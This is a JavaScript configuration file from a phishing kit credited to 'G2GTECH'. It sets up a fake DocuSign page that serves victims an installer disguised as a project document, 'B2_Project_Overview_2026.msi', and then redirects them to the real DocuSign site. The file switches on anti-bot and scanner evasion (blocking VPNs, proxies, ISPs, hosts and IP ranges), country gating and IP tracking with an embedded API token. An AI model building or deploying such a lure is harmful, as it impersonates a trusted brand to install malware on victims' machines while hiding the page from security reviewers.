// ========================================
// All rights reserved Page Created By G2GTECH ; Telegram : @rickofg2g
// ========================================

window.config = {
    // Basic Information
    Owner: "g2gtech",
    YourName: "g2gtech",
    PageName: "Docusign",

    // Access Control (Change these to secure your page)
    accessKey: "ad",
    accessValue: "ad",

    // Country Blocking
    countryBlock: "false",
    allowedCountry: "US",
    yourIPCountry: "0.0.0.0",

    // Anti-Bot Protection
    bot_protect: "on",
    userAgent: "on",
    block_ua: "on",
    block_isp: "on",
    block_host: "on",
    block_iprange: "on",
    block_vpn: "on",
    block_proxy_rdp: "on",
    lock_platform: "off",

    // IP Tracking
    ipinfo_token: '1006035904ee8d',

    // Download Settings
    downloadFile: "B2_Project_Overview_2026.msi",
    downloadName: "B2_Project_Overview_2026.msi",

    // Redirect URL
    redirectUrl: "https://www.docusign.com"
};

const Owner = window.config.Owner;
const YourName = window.config.YourName;
const PageName = window.config.PageName;
const accessKey = window.config.accessKey;
const accessValue = window.config.accessValue;
const countryBlock = window.config.countryBlock;
const allowedCountry = window.config.allowedCountry;
const yourIPCountry = window.config.yourIPCountry;
const bot_protect = window.config.bot_protect;
const userAgent = window.config.userAgent;
const block_ua = window.config.block_ua;
const block_isp = window.config.block_isp;
const block_host = window.config.block_host;
const block_iprange = window.config.block_iprange;
const block_vpn = window.config.block_vpn;
const block_proxy_rdp = window.config.block_proxy_rdp;
const lock_platform = window.config.lock_platform;
const ipinfo_token = window.config.ipinfo_token;
const downloadFile = window.config.downloadFile;
const downloadName = window.config.downloadName;
const redirectUrl = window.config.redirectUrl;

